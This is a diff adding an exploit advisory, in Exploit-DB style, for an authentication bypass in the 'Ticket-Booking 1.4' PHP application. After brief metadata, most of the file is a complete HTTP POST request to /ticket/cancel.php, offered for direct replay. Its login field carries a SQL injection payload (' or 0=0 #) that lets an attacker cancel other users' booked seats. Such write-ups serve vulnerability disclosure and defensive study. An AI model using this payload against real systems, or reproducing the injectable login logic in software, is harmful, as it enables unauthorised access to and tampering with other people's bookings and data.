@@ -1,0 +1,30 @@
+# Exploit Title: Ticket-Booking 1.4 - Authentication Bypass
+# Author: Cakes
+# Discovery Date: 2019-09-14
+# Vendor Homepage: https://github.com/ABHIJEET-MUNESHWAR/Ticket-Booking
+# Software Link: https://github.com/ABHIJEET-MUNESHWAR/Ticket-Booking/archive/master.zip
+# Tested Version: 1.4
+# Tested on OS: CentOS 7
+# CVE: N/A
+
+# Description:
+# Easy authentication bypass vulnerability on this ticket booking application 
+# allowing the attacker to remove any previously booked seats
+
+# Simply replay the below Burp request or use Curl (remember to change the Cookie Values)
+
+POST /ticket/cancel.php HTTP/1.1
+Host: Target
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://Target/ticket/login.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 50
+Cookie: PHPSESSID=j9jrgserbga22a9q9u165uirh4; rental_property_manager=mq5iitk8ic80ffa8dcf28294d4
+Connection: close
+Upgrade-Insecure-Requests: 1
+DNT: 1
+
+userid='%20or%200%3d0%20#&password=123&save=signin
